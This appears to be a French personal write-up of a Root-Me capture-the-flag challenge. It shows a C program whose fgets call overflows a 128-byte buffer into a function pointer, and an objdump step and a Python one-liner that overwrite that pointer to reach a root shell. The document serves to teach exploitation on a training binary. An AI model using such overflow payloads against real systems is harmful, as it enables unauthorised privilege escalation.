<script src="../../../js/password-protect.js"></script>

---
categorie: app-systeme
tags:
  - rootme
  - "#informatique/cyber"
---
# But : 

devenir root, pour acceder au .passwd 

# Le programme : 

```
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

void shell() {
    setreuid(geteuid(), geteuid());
    system("/bin/bash");
}

void sup() {
    printf("Hey dude ! Waaaaazzaaaaaaaa ?!\n");
}

void main()
{ 
    int var;
    void (*func)()=sup;
    char buf[128];
    fgets(buf,133,stdin);
    func();
}
```

Cette fois ci c'est la fonction fgets() qui est utilisÃ©e, celle qui vÃ©rifie la quantitÃ© d'info qu'on donne

# MÃ©thode de rÃ©solution

on va donc utiliser un outil pour savoir l'adresse mÃ©moire de la fonction "shell" du programme

```
objdump -D ch15
```

![[Pasted image 20240406204042.png]]

je trouve l'information "08048516"

c'est de l'hexa que l'on converti en shellcode : 0x16 0x85 0x04 0x08

je vais donc executer un petit code python, qui me permet d'afficher 128 "a" suivi du shellcode haxa, puis qui utilise "cat" pour rester dans la commande

```
((python -c "print 'A'*128+'\x16\x85\x04\x08'") ; cat)  | ./ch15
```


![[Pasted image 20240406210611.png]]

au final Ã§a fonction car on peut injecter une adresse car il n'y a pas l'aslr